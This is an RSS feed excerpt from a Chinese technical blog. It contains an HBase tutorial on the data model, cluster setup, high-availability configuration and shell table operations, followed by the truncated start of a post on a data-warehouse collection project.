      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-HBase简介"><a href="#1-HBase简介" class="headerlink" title="1 HBase简介"></a>1 HBase简介</h1><h2 id="1-1-HBase定义"><a href="#1-1-HBase定义" class="headerlink" title="1.1 HBase定义"></a>1.1 HBase定义</h2><p><a href="https://hbase.apache.org/">HBase</a>是一种分布式、可扩展、支持海量数据存储的<strong>NoSQL</strong>数据库。HBase底层是HDFS。用于实时处理场景。</p><h2 id="1-2-HBase数据模型"><a href="#1-2-HBase数据模型" class="headerlink" title="1.2 HBase数据模型"></a>1.2 HBase数据模型</h2><p>逻辑上，HBase的数据模型同关系型数据库很类似，数据存储在一张表中，有行有列。但从HBase的底层物理存储结构（K-V）来看，HBase更像是一个<strong>multi-dimensional map</strong>。</p><h3 id="1-2-1-HBase逻辑结构"><a href="#1-2-1-HBase逻辑结构" class="headerlink" title="1.2.1 HBase逻辑结构"></a>1.2.1 HBase逻辑结构</h3><p>再HBase中列不能单独存在，必须属于某个列族。一个列族有多个列。</p><p>Row key:行键 唯一性 自动排序（字典排序）。</p><p>region:分区，表横向切开 去维护。一个Region是存到一起的，即存到同一个机器中。</p><p>store：  按照列族去切割，一个store存到一个文件中。</p><p>​    <img src="/2020/11/25/bigdata-HBase1-setup/1637809034793.png" alt="1637809034793">             </p><h3 id="1-2-2-HBase物理存储结构（底层真实存储）"><a href="#1-2-2-HBase物理存储结构（底层真实存储）" class="headerlink" title="1.2.2 HBase物理存储结构（底层真实存储）"></a>1.2.2 HBase物理存储结构（底层真实存储）</h3><p>物理存储（真实存储的结构）其实是以KV进行存储，并存储在HDFS中，例如第一条数据：</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637821581208.png" alt="1637821581208"></p><p>通过时间戳TimeStamp去标识不同版本，因为HBase不能修改，因此，修改一条数据就是通过追加一条新数据，但是加一个新的时间戳。因此显示的时候，显示时间戳最大的数据即可。过期的数据会按照一定的机制去删除。</p><p>因此Hbase修改和新增的Type都是PUT。删除的Type是deletecolumn。</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637809177548.png" alt="1637809177548"></p><h3 id="1-2-3-数据模型"><a href="#1-2-3-数据模型" class="headerlink" title="1.2.3 数据模型"></a>1.2.3 数据模型</h3><p><strong>1）Name Space</strong></p><p>命名空间，类似于关系型<strong>数据库的database</strong>概念，每个命名空间下有多个表。HBase有两个自带的命名空间，分别是<strong>hbase和default</strong>，<strong>hbase中存放的是HBase内置的表，default表是用户默认使用的命名空间</strong>。</p><p><strong>2）Table</strong></p><p>类似于<strong>关系型数据库的表</strong>概念。不同的是，<strong>HBase定义表时只需要声明列族即可，不需要声明具体的列</strong>。这意味着，往HBase写入数据时，<strong>字段可以动态、按需指定</strong>。因此，和关系型数据库相比，HBase能够轻松应对字段变更的场景。</p><p><strong>3）Row</strong></p><p>HBase表中的每行数据都由一个RowKey和多个Column（列）组成，数据是按照RowKey的<strong>字典顺序</strong>存储的，并且<strong>查询数据时只能根据RowKey进行检索</strong>，所以RowKey的设计十分重要（<strong>如果根据其他列去查询例如名字，就会全表扫描，因此效率很低，通常不会使用</strong>）。</p><p><strong>4）Column</strong></p><p>HBase中的每个列都由<strong>Column Family(列族)**和</strong>Column Qualifier（列限定符）**进行限定，例如info：name，info：age。建表时，只需指明列族，而列限定符无需预先定义。</p><p><strong>5）Time Stamp</strong></p><p><strong>用于标识数据的不同版本</strong>（version），每条数据写入时，系统会自动为其加上该字段，其值为写入HBase的时间。</p><p><strong>6）Cell</strong></p><p>由{rowkey, column Family：column Qualifier, time Stamp} 唯一确定的单元。cell中的数据全部是字节码形式存贮。</p><h2 id="1-3-HBase基本架构（不完整版本）"><a href="#1-3-HBase基本架构（不完整版本）" class="headerlink" title="1.3 HBase基本架构（不完整版本）"></a>1.3 HBase基本架构（不完整版本）</h2><p>架构角色：</p><p><strong>1）Region Server</strong></p><p>Region Server为 Region的管理者，其实现类为HRegionServer，主要作用如下:</p><p>对于数据的操作：get, put, delete；（查询修改删除）</p><p>对于Region的操作：splitRegion（切分）、compactRegion（合并storeFile）。</p><p><strong>2）Master</strong></p><p>Master是所有<strong>Region Server</strong>的管理者，其实现类为HMaster，主要作用如下：</p><p>对于表的操作：create, delete, alter（涉及元数据的管理）</p><p>对于RegionServer的操作：分配regions到每个RegionServer，监控每个RegionServer的状态，负载均衡和故障转移。</p><p><strong>3）Zookeeper</strong></p><p>HBase通过Zookeeper来做master的高可用、<strong>RegionServer的监控</strong>、元数据的入口以及集群配置的维护等工作。</p><p><strong>4）HDFS</strong></p><p>HDFS为Hbase提供最终的底层数据存储服务，同时为HBase提供高可用的支持。</p><p>  <img src="/2020/11/25/bigdata-HBase1-setup/1637809993409.png" alt="1637809993409"></p><h1 id="2-HBase安装部署"><a href="#2-HBase安装部署" class="headerlink" title="2 HBase安装部署"></a>2 HBase安装部署</h1><h2 id="2-1-HBase的解压"><a href="#2-1-HBase的解压" class="headerlink" title="2.1 HBase的解压"></a>2.1 HBase的解压</h2><p>解压Hbase到指定目录：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf hbase-2.0.5-bin.tar.gz -C /opt/module<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">mv</span> /opt/module/hbase-2.0.5 /opt/module/hbase<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span class="token comment" spellcheck="true">#添加</span><span class="token comment" spellcheck="true">#HBASE_HOME</span><span class="token function">export</span> HBASE_HOME<span class="token operator">=</span>/opt/module/hbase<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HBASE_HOME</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-HBase的配置文件"><a href="#2-2-HBase的配置文件" class="headerlink" title="2.2 HBase的配置文件"></a>2.2 HBase的配置文件</h2><p>修改HBase对应的配置文件。</p><p>1）hbase-env.sh修改内容：</p><p>不要使用内置的ZK。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HBASE_MANAGES_ZK<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）hbase-site.xml修改内容：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.rootdir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hdfs://hadoop102:8020/hbase<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.cluster.distributed<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.zookeeper.quorum<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop102,hadoop103,hadoop104<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）regionservers：类似于workers</p><pre class="line-numbers language-bash"><code class="language-bash">vim regionservershadoop102hadoop103hadoop104<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-3-HBase远程发送到其他集群"><a href="#2-3-HBase远程发送到其他集群" class="headerlink" title="2.3 HBase远程发送到其他集群"></a>2.3 HBase远程发送到其他集群</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync hbase/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-Zookeeper正常部署"><a href="#2-4-Zookeeper正常部署" class="headerlink" title="2.4 Zookeeper正常部署"></a>2.4 Zookeeper正常部署</h2><p>首先保证Zookeeper集群的正常部署，并启动之：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span class="token punctuation">[</span>molly@hadoop103 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span class="token punctuation">[</span>molly@hadoop104 zookeeper-3.5.7<span class="token punctuation">]</span>$ bin/zkServer.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-5Hadoop正常部署"><a href="#2-5Hadoop正常部署" class="headerlink" title="2.5Hadoop正常部署"></a>2.5Hadoop正常部署</h2><p>Hadoop集群的正常部署并启动：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-6-HBase服务的启动"><a href="#2-6-HBase服务的启动" class="headerlink" title="2.6 HBase服务的启动"></a>2.6 HBase服务的启动</h2><h3 id="2-6-1-单点启动"><a href="#2-6-1-单点启动" class="headerlink" title="2.6.1 单点启动"></a>2.6.1 单点启动</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/hbase-daemon.sh start master<span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/hbase-daemon.sh start regionserver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提示：如果集群之间的节点时间不同步，会导致regionserver无法启动，抛出ClockOutOfSyncException异常。</p><p>修复提示：错误提示如下所示：</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637823414826.png" alt="1637823414826"></p><p>a、同步时间服务</p><p>将几台机器进行时间同步操作。</p><p>b、属性：hbase.master.maxclockskew设置更大的值</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.master.maxclockskew<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>180000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Time difference of regionserver from master<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-6-2-群启"><a href="#2-6-2-群启" class="headerlink" title="2.6.2 群启"></a>2.6.2 群启</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/start-hbase.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应的停止服务：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/stop-hbase.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/25/bigdata-HBase1-setup/1637822682585.png" alt="1637822682585"></p><p>可以看到在那台机器去启用Hbase,那台就是HMaster，这里可以看到102是HMaster</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637822698155.png" alt="1637822698155"></p><p>查看ZK：</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637822773695.png" alt="1637822773695"></p><h2 id="2-7-查看HBase页面"><a href="#2-7-查看HBase页面" class="headerlink" title="2.7 查看HBase页面"></a>2.7 查看HBase页面</h2><p>启动成功后，可以通过“host:port”的方式来访问HBase管理页面，例如：</p><p><a href="http://linux01:16010/">http://hadoop102:16010</a> 可以看到有3个region server</p><p><img src="/2020/11/25/bigdata-HBase1-setup/1637822822917.png" alt="1637822822917"></p><h2 id="2-8-高可用-可选"><a href="#2-8-高可用-可选" class="headerlink" title="2.8 高可用(可选)"></a>2.8 高可用(可选)</h2><p>在HBase中HMaster负责监控<strong>HRegionServer</strong>的生命周期，均衡RegionServer的负载，如果HMaster挂掉了，那么整个HBase集群将陷入不健康的状态，并且此时的工作状态并不会维持太久。所以HBase支持对HMaster的高可用配置。</p><p>1）关闭HBase集群（如果没有开启则跳过此步）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/stop-hbase.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在conf目录下创建backup-masters文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ <span class="token function">touch</span> conf/backup-masters<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）在backup-masters文件中配置高可用HMaster节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> hadoop103 <span class="token operator">></span> conf/backup-masters<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）将整个conf目录scp到其他节点</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ <span class="token function">scp</span> -r conf/ hadoop103:/opt/module/hbase/<span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ <span class="token function">scp</span> -r conf/ hadoop104:/opt/module/hbase/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5）打开页面测试查看</p><p><a href="http://linux01:16010/">http://hadooo102:16010</a> </p><h1 id="3-HBase-Shell操作"><a href="#3-HBase-Shell操作" class="headerlink" title="3 HBase Shell操作"></a>3 HBase Shell操作</h1><h2 id="3-1-基本操作"><a href="#3-1-基本操作" class="headerlink" title="3.1 基本操作"></a>3.1 基本操作</h2><p>1）进入HBase客户端命令行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hbase<span class="token punctuation">]</span>$ bin/hbase shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）查看帮助命令</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:001:0<span class="token operator">></span> <span class="token function">help</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-namespace的操作"><a href="#3-2-namespace的操作" class="headerlink" title="3.2 namespace的操作"></a>3.2 namespace的操作</h2><p>1）查看当前Hbase中有哪些namespace</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:002:0<span class="token operator">></span> list_namespace<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> NAMESPACE                                                                                               </p><p>default(创建表时未指定命名空间的话默认在default下)                                                </p><p>hbase(系统使用的，用来存放系统相关的元数据信息等，勿随便操作) </p><p>2）创建namespace</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span> create_namespace <span class="token string">"test"</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span> create_namespace <span class="token string">"test01"</span>, <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"author"=>"wyh", "create_time"=>"2020-03-10 08:08:08"&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）查看namespace</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span>  describe_namespace <span class="token string">"test01"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）修改namespace的信息（添加或者修改属性）</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span> alter_namespace <span class="token string">"test01"</span>, <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;METHOD => 'set', 'author' => 'weiyunhui'&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加或者修改属性:</p><pre class="line-numbers language-bash"><code class="language-bash">alter_namespace <span class="token string">'ns1'</span>, <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;METHOD => 'set', 'PROPERTY_NAME' => 'PROPERTY_VALUE'&amp;#125; </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除属性:     </p><pre class="line-numbers language-bash"><code class="language-bash">alter_namespace <span class="token string">'ns1'</span>, <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;METHOD => 'unset', NAME => ' PROPERTY_NAME '&amp;#125; </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）删除namespace</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span> drop_namespace <span class="token string">"test01"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意: 要删除的namespace必须是空的，其下没有表。</p><h2 id="3-3-表的操作"><a href="#3-3-表的操作" class="headerlink" title="3.3 表的操作"></a>3.3 表的操作</h2><p>0）查看当前数据库中有哪些表</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:002:0<span class="token operator">></span> list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1）创建表</p><p>创建student表，列族info</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:002:0<span class="token operator">></span> create <span class="token string">'student'</span>,<span class="token string">'info'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）插入数据到表</p><p>表明，rowkey,列，value</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:003:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:sex'</span>,<span class="token string">'male'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:004:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:age'</span>,<span class="token string">'18'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:005:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1002'</span>,<span class="token string">'info:name'</span>,<span class="token string">'Janna'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:006:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1002'</span>,<span class="token string">'info:sex'</span>,<span class="token string">'female'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:007:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1002'</span>,<span class="token string">'info:age'</span>,<span class="token string">'20'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）扫描查看表数据</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:008:0<span class="token operator">></span> scan <span class="token string">'student'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:009:0<span class="token operator">></span> scan <span class="token string">'student'</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;STARTROW => '1001', STOPROW => '1001'&amp;#125;</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:010:0<span class="token operator">></span> scan <span class="token string">'student'</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;STARTROW => '1001'&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4）查看表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:011:0<span class="token operator">></span> describe <span class="token string">'student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）更新指定字段的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:012:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:name'</span>,<span class="token string">'Nick'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:013:0<span class="token operator">></span> put <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:age'</span>,<span class="token string">'100'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）查看“指定行”或“指定列族:列”的数据必须：<strong>指定rowkey</strong></p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:014:0<span class="token operator">></span> get <span class="token string">'student'</span>,<span class="token string">'1001'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:015:0<span class="token operator">></span> get <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:name'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:015:0<span class="token operator">></span> get <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token string">'info:name'</span>,<span class="token string">'info:age'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>7）统计表数据行数</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:021:0<span class="token operator">></span> count <span class="token string">'student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）删除数据</p><p>删除某rowkey的全部数据：</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:016:0<span class="token operator">></span> deleteall <span class="token string">'student'</span>,<span class="token string">'1001'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除某rowkey的某一列数据：</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:017:0<span class="token operator">></span> delete <span class="token string">'student'</span>,<span class="token string">'1002'</span>,<span class="token string">'info:sex'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9）清空表数据</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:018:0<span class="token operator">></span> truncate <span class="token string">'student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示：清空表的操作顺序为先disable，然后再truncate。</p><p>10）删除表</p><p>首先需要先让该表为disable状态：</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:019:0<span class="token operator">></span> disable <span class="token string">'student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后才能drop这个表：</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:020:0<span class="token operator">></span> drop <span class="token string">'student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示：如果直接drop表，会报错：ERROR: Table student is enabled. Disable it first.</p><p>11）变更表信息</p><p>将info列族中的数据存放3个版本：</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:022:0<span class="token operator">></span> alter <span class="token string">'student'</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;NAME=>'info',VERSIONS=>3&amp;#125;</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:022:0<span class="token operator">></span> get <span class="token string">'student'</span>,<span class="token string">'1001'</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;COLUMN=>'info:name',VERSIONS=>3&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/HBase/">HBase</category>
      
      
      <comments>https://m01ly.github.io/2020/11/25/bigdata-HBase1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>大数据实践（一）数仓采集项目</title>
      <link>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/</link>
      <guid>https://m01ly.github.io/2020/11/23/bigdata-datacollect1-userbehavior/</guid>
      <pubDate>Mon, 23 Nov 2020 07:10:21 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-数仓概念"><a href="#1-数仓概念" class="headerlink" title="1 数仓概念"></a>1 数仓概念</h1><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637651564709.png" alt="1637651564709"></p><h1 id="2-项目需求及架构设计"><a href="#2-项目需求及架构设计" class="headerlink" title="2 项目需求及架构设计"></a>2 项目需求及架构设计</h1><h2 id="2-1-项目需求分析"><a href="#2-1-项目需求分析" class="headerlink" title="2.1 项目需求分析"></a>2.1 项目需求分析</h2><p>1）用户行为数据采集平台搭建（存在日志服务器-用flume采集到数据仓库（hdfs）中）<br>2）业务数据采集平台搭建（存在mysql,oracle）：通过sqoop采集到数据仓库（hdfs）中<br>3）数据仓库维度建模：建库建表<br>4）分析，设备 会员 商品 地区 活动等电商核心主题，统计的报表指标近100个。<br>5）采用即席查询工具，随时进行指标分析<br>6）对集群性能进行监控，发送异常需要报警<br>7）元数据管理：管理Hive的元数据(数仓的核心就是hive)<br>8）质量监控：数仓分析的质量 有没有丢数据等</p><h2 id="2-2-项目框架"><a href="#2-2-项目框架" class="headerlink" title="2.2 项目框架"></a>2.2 项目框架</h2><h3 id="2-2-1-技术选型"><a href="#2-2-1-技术选型" class="headerlink" title="2.2.1 技术选型"></a>2.2.1 技术选型</h3><p>技术选型主要考虑因素：数据量大小，业务需求，行业内经验，技术成熟度、开发维护成本、总成本预算。下面加粗的是本次选择的。</p><ul><li>数据采集传输：<strong>Flume</strong>,Logstash(elk系列),<strong>Kafka</strong>,<strong>Sqoop</strong>（开源的）,DataX（阿里技术，比Sqoop强大）</li><li>数据存储：<strong>Mysq</strong>,<strong>HDFS</strong>,HBase,Redis,MongoDB</li><li>数据计算：<strong>Hive</strong>,Tez,<strong>Spark</strong>,Flink,Storm(Hive底层用Tex或者Spark)，Storm较早 